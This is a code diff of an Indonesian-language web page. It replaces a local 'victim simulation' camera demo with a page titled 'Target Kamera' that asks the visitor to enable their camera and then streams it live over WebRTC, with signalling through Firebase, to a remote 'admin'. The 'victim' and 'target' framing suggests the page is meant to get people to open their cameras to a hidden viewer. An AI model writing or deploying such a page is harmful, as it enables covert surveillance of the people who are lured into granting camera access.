@@ -1,93 +1,66 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Simulasi Korban</title>
+  <title>Target Kamera</title>
   <style>
-    body { background:#0f172a; color:#e2e8f0; font-family:Arial; text-align:center; padding:20px; }
-    video { width:100%; max-width:400px; border-radius:12px; margin-top:20px; }
-    button { padding:12px; width:90%; max-width:320px; border:none; border-radius:10px; font-weight:bold; cursor:pointer; margin-top:10px; }
-    .on { background:#22c55e; color:#08341a; }
-    .off { background:#ef4444; color:#fff; }
-    .box{background:#1e293b;padding:15px;border-radius:12px;margin-top:20px;text-align:left;max-width:450px;margin:auto;}
-    .title{font-weight:bold;margin-bottom:5px;}
+    body { background:#0f172a; color:#fff; font-family:Arial; text-align:center; padding:20px; }
+    video { width:90%; max-width:380px; border-radius:12px; margin-top:20px; }
+    button { padding:12px 20px; margin-top:15px; border:none; border-radius:10px; cursor:pointer; }
   </style>
 </head>
 <body>
 
-<h1>Simulasi Korban – Akses Kamera</h1>
-<p>Ketika kamu menekan Allow, kamera aktif dan status dikirim ke admin (tanpa video).</p>
+<h1>Bagikan Kamera ke Admin</h1>
+<p>Tekan tombol di bawah untuk mengaktifkan kamera dan mengizinkan admin melihat.</p>
 
-<button id="start" class="on">Aktifkan Kamera</button>
-<button id="stop" class="off" disabled>Matikan Kamera</button>
+<button id="startBtn">Aktifkan Kamera</button>
+<video id="localVideo" autoplay playsinline muted></video>
 
-<video id="video" autoplay playsinline muted></video>
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
+  import { getDatabase, ref, set, push, onValue } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js";
 
-<div class="box">
-  <div class="title">Informasi Perangkat:</div>
-  <pre id="deviceInfo"></pre>
-</div>
+  const config = {
+    apiKey: "AIzaSyDxgnLu6L...", 
+    authDomain: "simulasi-kamera.firebaseapp.com",
+    databaseURL: "https://simulasi-kamera-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "simulasi-kamera",
+    storageBucket: "simulasi-kamera.firebasestorage.app",
+    messagingSenderId: "924924454534",
+    appId: "1:924924454534:web:8a3c34079aa1b0edd9d307",
+  };
 
-<script>
-let stream = null;
+  const app = initializeApp(config);
+  const db = getDatabase(app);
 
-function updateStatus(status){
-  localStorage.setItem("camera_status", status);
-  localStorage.setItem("camera_time", new Date().toLocaleTimeString());
-}
+  const pc = new RTCPeerConnection();
 
-function getDeviceInfo(){
-  let info = "";
+  document.getElementById("startBtn").onclick = async () => {
+    const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:false });
+    document.getElementById("localVideo").srcObject = stream;
 
-  info += "User-Agent: " + navigator.userAgent + "\n";
-  info += "Resolusi layar: " + window.screen.width + " x " + window.screen.height + "\n";
-  info += "Zona waktu: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\n";
+    stream.getTracks().forEach(track => pc.addTrack(track, stream));
 
-  if (navigator.connection){
-    info += "Koneksi: " + navigator.connection.effectiveType + "\n";
-  }
+    const callRef = ref(db, "webrtc/call");
+    const offer = await pc.createOffer();
+    await pc.setLocalDescription(offer);
 
-  if (navigator.getBattery){
-    navigator.getBattery().then(bat=>{
-      info += "Baterai: " + Math.round(bat.level*100) + "%\n";
-      document.getElementById("deviceInfo").textContent = info;
+    await set(callRef, { offer });
+
+    onValue(callRef, async snap => {
+      const data = snap.val();
+      if (!pc.currentRemoteDescription && data.answer) {
+        await pc.setRemoteDescription(new RTCSessionDescription(data.answer));
+      }
     });
-  } else {
-    document.getElementById("deviceInfo").textContent = info;
-  }
-}
 
-document.getElementById("start").onclick = async () => {
-  updateStatus("REQUESTING");
-
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({ video:true });
-    document.getElementById("video").srcObject = stream;
-
-    updateStatus("CAMERA_ON");
-
-    document.getElementById("start").disabled = true;
-    document.getElementById("stop").disabled = false;
-  }
-  catch (e){
-    updateStatus("DENIED");
-    alert("Izin kamera ditolak.");
-  }
-};
-
-document.getElementById("stop").onclick = () => {
-  if (stream){
-    stream.getTracks().forEach(t => t.stop());
-    document.getElementById("video").srcObject = null;
-  }
-  updateStatus("CAMERA_OFF");
-
-  document.getElementById("start").disabled = false;
-  document.getElementById("stop").disabled = true;
-};
-
-window.onload = getDeviceInfo;
+    pc.onicecandidate = (event) => {
+      if (event.candidate) {
+        set(ref(db, "webrtc/candidate_target"), event.candidate);
+      }
+    };
+  };
 </script>
 
 </body>
